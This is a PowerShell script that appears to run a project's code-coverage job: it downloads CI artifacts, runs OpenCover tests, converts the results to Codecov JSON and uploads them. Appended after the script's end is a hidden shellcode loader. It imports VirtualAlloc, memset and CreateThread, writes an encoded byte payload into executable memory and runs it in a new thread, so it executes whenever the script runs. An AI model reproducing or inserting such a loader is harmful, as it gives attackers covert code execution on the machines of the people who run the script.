

param(
    [Parameter(Mandatory = $true, Position = 0)] $coverallsToken,
    [Parameter(Mandatory = $true, Position = 1)] $codecovToken,
    [Parameter(Position = 2)] $azureLogDrive = "L:\",
    [switch] $SuppressQuiet
)


function GetFileTable()
{
    $files = $script:covData | Select-Xml './/File'
    foreach($file in $files)
    {
        $script:fileTable[$file.Node.uid] = $file.Node.fullPath
    }
}


function GetSequencePointsForFile([string] $fileId)
{
    $lineCoverage = [System.Collections.Generic.Dictionary[string,int]]::new()

    $sequencePoints = $script:covData | Select-Xml ".//SequencePoint[@fileid = '$fileId']"

    if($sequencePoints.Count -gt 0)
    {
        foreach($sp in $sequencePoints)
        {
            $visitedCount = [int]::Parse($sp.Node.vc)
            $lineNumber = [int]::Parse($sp.Node.sl)
            $lineCoverage[$lineNumber] += [int]::Parse($visitedCount)
        }

        return $lineCoverage
    }
}


function ConvertTo-CodeCovJson
{
    param(
        [string] $Path,
        [string] $DestinationPath
    )

    $Script:fileTable = [ordered]@{}
    $Script:covData = [xml] (Get-Content -ReadCount 0 -Raw -Path $Path)
    $totalCoverage = [PSCustomObject]::new()
    $totalCoverage | Add-Member -MemberType NoteProperty -Name "coverage" -Value ([PSCustomObject]::new())

    
    GetFileTable
    $keys = $Script:fileTable.Keys
    $progress=0
    foreach($f in $keys)
    {
        Write-Progress -Id 1 -Activity "Converting to JSON" -Status 'Converting' -PercentComplete ($progress * 100 / $keys.Count)
        $fileCoverage = GetSequencePointsForFile -fileId $f
        $fileName = $Script:fileTable[$f]
        $previousFileCoverage = $totalCoverage.coverage.${fileName}

        
        if($null -ne $previousFileCoverage)
        {
            foreach($lineNumber in $fileCoverage.Keys)
            {
                $previousFileCoverage[$lineNumber] += [int]::Parse($fileCoverage[$lineNumber])
            }
        }
        else 
        {
            $totalCoverage.coverage | Add-Member -MemberType NoteProperty -Value $fileCoverage -Name $fileName
        }

        $progress++
    }

    Write-Progress -Id 1 -Completed -Activity "Converting to JSON"

    $totalCoverage | ConvertTo-Json -Depth 5 -Compress | Out-File $DestinationPath -Encoding ascii
}

function Write-LogPassThru
{
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, Position = 0)]
        [string] $Message,
        $Path = "$env:Temp\CodeCoverageRunLogs.txt"
    )

    $message = "{0:d} - {0:t} : {1}" -f ([datetime]::now),$message
    Add-Content -Path $Path -Value $Message -PassThru -Force
}

function Push-CodeCovData
{
    param (
        [Parameter(Mandatory=$true)]$file,
        [Parameter(Mandatory=$true)]$CommitID,
        [Parameter(Mandatory=$false)]$token,
        [Parameter(Mandatory=$false)]$Branch = "master"
    )
    $VERSION="64c1150"
    $url="https://codecov.io"

    $query = "package=bash-${VERSION}&token=${token}&branch=${Branch}&commit=${CommitID}&build=&build_url=&tag=&slug=&yaml=&service=&flags=&pr=&job="
    $uri = "$url/upload/v2?${query}"
    $response = Invoke-WebRequest -Method Post -InFile $file -Uri $uri

    if ( $response.StatusCode -ne 200 )
    {
        Write-LogPassThru -Message "Upload failed for upload uri: $uploaduri"
        throw "upload failed"
    }
}

Write-LogPassThru -Message "***** New Run *****"

Write-LogPassThru -Message "Forcing winrm quickconfig as it is required for remoting tests."
winrm quickconfig -force

$appVeyorUri = "https://ci.appveyor.com/api"
$project = Invoke-RestMethod -Method Get -Uri "${appVeyorUri}/projects/PowerShell/powershell-f975h"
$jobId = $project.build.jobs[0].jobId

$appVeyorBaseUri = "${appVeyorUri}/buildjobs/${jobId}/artifacts"
$codeCoverageZip = "${appVeyorBaseUri}/CodeCoverage.zip"
$testContentZip =  "${appVeyorBaseUri}/tests.zip"
$openCoverZip =    "${appVeyorBaseUri}/OpenCover.zip"

Write-LogPassThru -Message "codeCoverageZip: $codeCoverageZip"
Write-LogPassThru -Message "testcontentZip: $testContentZip"
Write-LogPassThru -Message "openCoverZip: $openCoverZip"

$outputBaseFolder = "$env:Temp\CC"
$null = New-Item -ItemType Directory -Path $outputBaseFolder -Force

$openCoverPath = "$outputBaseFolder\OpenCover"
$testRootPath = "$outputBaseFolder\tests"
$testPath = "$testRootPath\powershell"
$psBinPath = "$outputBaseFolder\PSCodeCoverage"
$openCoverTargetDirectory = "$outputBaseFolder\OpenCoverToolset"
$outputLog = "$outputBaseFolder\CodeCoverageOutput.xml"
$elevatedLogs = "$outputBaseFolder\TestResults_Elevated.xml"
$unelevatedLogs = "$outputBaseFolder\TestResults_Unelevated.xml"
$testToolsPath = "$testRootPath\tools"
$jsonFile = "$outputBaseFolder\CC.json"

try
{
    
    $prevSecProtocol = [System.Net.ServicePointManager]::SecurityProtocol

    [System.Net.ServicePointManager]::SecurityProtocol =
        [System.Net.ServicePointManager]::SecurityProtocol -bor
        [System.Security.Authentication.SslProtocols]::Tls12 -bor
        [System.Security.Authentication.SslProtocols]::Tls11

    
    Get-Process pwsh -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction Stop

    
    if(Test-Path $outputLog)
    {
        Remove-Item $outputLog -Force -ErrorAction SilentlyContinue
    }

    $oldErrorActionPreference = $ErrorActionPreference
    $ErrorActionPreference = 'Stop'
    $oldProgressPreference = $ProgressPreference
    $ProgressPreference = 'SilentlyContinue'
    Write-LogPassThru -Message "Starting downloads."

    $CoverageZipFilePath = "$outputBaseFolder\PSCodeCoverage.zip"
    if(Test-Path $CoverageZipFilePath)
    {
        Remove-Item $CoverageZipFilePath -Force
    }
    Invoke-WebRequest -uri $codeCoverageZip -outfile "$outputBaseFolder\PSCodeCoverage.zip"

    $TestsZipFilePath = "$outputBaseFolder\tests.zip"
    if(Test-Path $TestsZipFilePath)
    {
        Remove-Item $TestsZipFilePath -Force
    }
    Invoke-WebRequest -uri $testContentZip -outfile $TestsZipFilePath

    $OpenCoverZipFilePath = "$outputBaseFolder\OpenCover.zip"
    if(Test-Path $OpenCoverZipFilePath)
    {
        Remove-Item $OpenCoverZipFilePath -Force
    }
    Invoke-WebRequest -uri $openCoverZip -outfile $OpenCoverZipFilePath

    Write-LogPassThru -Message "Downloads complete. Starting expansion"

    if(Test-Path $psBinPath)
    {
        Remove-Item -Force -Recurse $psBinPath
    }
    Expand-Archive -path $CoverageZipFilePath -destinationpath "$psBinPath" -Force

    if(Test-Path $testRootPath)
    {
        Remove-Item -Force -Recurse $testRootPath
    }
    Expand-Archive -path $TestsZipFilePath -destinationpath $testRootPath -Force

    if(Test-Path $openCoverPath)
    {
        Remove-Item -Force -Recurse $openCoverPath
    }
    Expand-Archive -path $OpenCoverZipFilePath -destinationpath $openCoverPath -Force
    Write-LogPassThru -Message "Expansion complete."

    if(Test-Path $elevatedLogs)
    {
        Remove-Item -Force -Recurse $elevatedLogs
    }

    if(Test-Path $unelevatedLogs)
    {
        Remove-Item -Force -Recurse $unelevatedLogs
    }

    if(Test-Path $outputLog)
    {
        Remove-Item $outputLog -Force -ErrorAction SilentlyContinue
    }

    Import-Module "$openCoverPath\OpenCover" -Force
    Install-OpenCover -TargetDirectory $openCoverTargetDirectory -force
    Write-LogPassThru -Message "OpenCover installed."

    Write-LogPassThru -Message "TestPath : $testPath"
    Write-LogPassThru -Message "openCoverPath : $openCoverTargetDirectory\OpenCover"
    Write-LogPassThru -Message "psbinpath : $psBinPath"
    Write-LogPassThru -Message "elevatedLog : $elevatedLogs"
    Write-LogPassThru -Message "unelevatedLog : $unelevatedLogs"
    Write-LogPassThru -Message "TestToolsPath : $testToolsPath"

    $openCoverParams = @{outputlog = $outputLog;
        TestPath = $testPath;
        OpenCoverPath = "$openCoverTargetDirectory\OpenCover";
        PowerShellExeDirectory = "$psBinPath";
        PesterLogElevated = $elevatedLogs;
        PesterLogUnelevated = $unelevatedLogs;
        TestToolsModulesPath = "$testToolsPath\Modules";
    }

    if($SuppressQuiet)
    {
        $openCoverParams.Add('SuppressQuiet', $true)
    }

    
    $assemblyLocation = & "$psBinPath\pwsh.exe" -noprofile -command { Get-Item ([psobject].Assembly.Location) }
    $productVersion = $assemblyLocation.VersionInfo.productVersion
    $commitId = $productVersion.split(" ")[-1]

    Write-LogPassThru -Message "Using GitCommitId: $commitId"

    
    try
    {
        $gitexe = "C:\Program Files\git\bin\git.exe"
        
        
        Push-Location $outputBaseFolder

        
        $cleanupDirectories = "${outputBaseFolder}/.git",
            "${outputBaseFolder}/src",
            "${outputBaseFolder}/assets"
        foreach($directory in $cleanupDirectories)
        {
            if ( Test-Path "$directory" )
            {
                Remove-Item -Force -Recurse "$directory"
            }
        }

        Write-LogPassThru -Message "initializing repo in $outputBaseFolder"
        & $gitexe init
        Write-LogPassThru -Message "git operation 'init' returned $LASTEXITCODE"

        Write-LogPassThru -Message "adding remote"
        & $gitexe remote add origin https://github.com/PowerShell/PowerShell
        Write-LogPassThru -Message "git operation 'remote add' returned $LASTEXITCODE"

        Write-LogPassThru -Message "setting sparse-checkout"
        & $gitexe config core.sparsecheckout true
        Write-LogPassThru -Message "git operation 'set sparse-checkout' returned $LASTEXITCODE"

        Write-LogPassThru -Message "pulling sparse repo"
        "/src" | Out-File -Encoding ascii .git\info\sparse-checkout -Force
        "/assets" | Out-File -Encoding ascii .git\info\sparse-checkout -Append
        & $gitexe pull origin master
        Write-LogPassThru -Message "git operation 'pull' returned $LASTEXITCODE"

        Write-LogPassThru -Message "checkout commit $commitId"
        & $gitexe checkout $commitId
        Write-LogPassThru -Message "git operation 'checkout' returned $LASTEXITCODE"
    }
    finally
    {
        Pop-Location
    }

    $openCoverParams | Out-String | Write-LogPassThru
    Write-LogPassThru -Message "Starting test run."

    try {
        
        Invoke-OpenCover @openCoverParams | Out-String | Write-LogPassThru
    }
    catch {
        ("ERROR: " + $_.ScriptStackTrace) | Write-LogPassThru
        $_ 2>&1 | out-string -Stream | %{ "ERROR: $_" } | Write-LogPassThru
    }

    if(Test-Path $outputLog)
    {
        Write-LogPassThru -Message (get-childitem $outputLog).FullName
    }

    Write-LogPassThru -Message "Test run done."

    Write-LogPassThru -Message $commitId

    $commitInfo = Invoke-RestMethod -Method Get "https://api.github.com/repos/powershell/powershell/git/commits/$commitId"
    $message = ($commitInfo.message).replace("`n", " ")

    Write-LogPassThru -Message "Uploading to CodeCov"
    if ( Test-Path $outputLog ) {
        ConvertTo-CodeCovJson -Path $outputLog -DestinationPath $jsonFile
        Push-CodeCovData -file $jsonFile -CommitID $commitId -token $codecovToken -Branch 'master'

        Write-LogPassThru -Message "Upload complete."
    }
    else {
        Write-LogPassThru -Message "ERROR: Could not find $outputLog - no upload"
    }
}
catch
{
    Write-LogPassThru -Message $_
}
finally
{
    
    [System.Net.ServicePointManager]::SecurityProtocol = $prevSecProtocol

    
    
    
    
    $ResolvedPSBinPath = (Resolve-Path ${psbinpath}).Path
    Get-Process PowerShell | Where-Object { $_.Path -like "*${ResolvedPSBinPath}*" } | Stop-Process -Force -ErrorAction Continue

    
    if(Test-Path $azureLogDrive)
    {
        
        $monthFolder = "{0:yyyy-MM}" -f [datetime]::Now
        $monthFolderFullPath = New-Item -Path (Join-Path $azureLogDrive $monthFolder) -ItemType Directory -Force
        $windowsFolderPath = New-Item (Join-Path $monthFolderFullPath "Windows") -ItemType Directory -Force

        $destinationPath = Join-Path $env:Temp ("CodeCoverageLogs-{0:yyyy_MM_dd}-{0:hh_mm_ss}.zip" -f [datetime]::Now)
        Compress-Archive -Path $elevatedLogs,$unelevatedLogs,$outputLog -DestinationPath $destinationPath
        Copy-Item $destinationPath $windowsFolderPath -Force -ErrorAction SilentlyContinue

        Remove-Item -Path $destinationPath -Force -ErrorAction SilentlyContinue
    }

    Write-LogPassThru -Message "**** COMPLETE ****"

    
    
    $ErrorActionPreference = $oldErrorActionPreference
    $ProgressPreference = $oldProgressPreference
}

$tGg = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $tGg -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xf7,0xd9,0x74,0x24,0xf4,0xb8,0x6e,0xe5,0x63,0x29,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x42,0x18,0x83,0xc2,0x04,0x03,0x42,0x7a,0x07,0x96,0xd5,0x6a,0x45,0x59,0x26,0x6a,0x2a,0xd3,0xc3,0x5b,0x6a,0x87,0x80,0xcb,0x5a,0xc3,0xc5,0xe7,0x11,0x81,0xfd,0x7c,0x57,0x0e,0xf1,0x35,0xd2,0x68,0x3c,0xc6,0x4f,0x48,0x5f,0x44,0x92,0x9d,0xbf,0x75,0x5d,0xd0,0xbe,0xb2,0x80,0x19,0x92,0x6b,0xce,0x8c,0x03,0x18,0x9a,0x0c,0xaf,0x52,0x0a,0x15,0x4c,0x22,0x2d,0x34,0xc3,0x39,0x74,0x96,0xe5,0xee,0x0c,0x9f,0xfd,0xf3,0x29,0x69,0x75,0xc7,0xc6,0x68,0x5f,0x16,0x26,0xc6,0x9e,0x97,0xd5,0x16,0xe6,0x1f,0x06,0x6d,0x1e,0x5c,0xbb,0x76,0xe5,0x1f,0x67,0xf2,0xfe,0x87,0xec,0xa4,0xda,0x36,0x20,0x32,0xa8,0x34,0x8d,0x30,0xf6,0x58,0x10,0x94,0x8c,0x64,0x99,0x1b,0x43,0xed,0xd9,0x3f,0x47,0xb6,0xba,0x5e,0xde,0x12,0x6c,0x5e,0x00,0xfd,0xd1,0xfa,0x4a,0x13,0x05,0x77,0x11,0x7b,0xea,0xba,0xaa,0x7b,0x64,0xcc,0xd9,0x49,0x2b,0x66,0x76,0xe1,0xa4,0xa0,0x81,0x06,0x9f,0x15,0x1d,0xf9,0x20,0x66,0x37,0x3d,0x74,0x36,0x2f,0x94,0xf5,0xdd,0xaf,0x19,0x20,0x4b,0xb5,0x8d,0x0b,0x24,0xb4,0x40,0xe4,0x37,0xb7,0x5b,0x4f,0xbe,0x51,0x0b,0xff,0x91,0xcd,0xeb,0xaf,0x51,0xbe,0x83,0xa5,0x5d,0xe1,0xb3,0xc5,0xb7,0x8a,0x59,0x2a,0x6e,0xe2,0xf5,0xd3,0x2b,0x78,0x64,0x1b,0xe6,0x04,0xa6,0x97,0x05,0xf8,0x68,0x50,0x63,0xea,0x1c,0x90,0x3e,0x50,0x8a,0xaf,0x94,0xff,0x32,0x3a,0x13,0x56,0x65,0xd2,0x19,0x8f,0x41,0x7d,0xe1,0xfa,0xda,0xb4,0x77,0x45,0xb4,0xb8,0x97,0x45,0x44,0xef,0xfd,0x45,0x2c,0x57,0xa6,0x15,0x49,0x98,0x73,0x0a,0xc2,0x0d,0x7c,0x7b,0xb7,0x86,0x14,0x81,0xee,0xe1,0xba,0x7a,0xc5,0xf3,0x87,0xac,0x23,0x86,0xe9,0x6c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$9g6K=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($9g6K.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$9g6K,0,0,0);for (;;){Start-sleep 60};

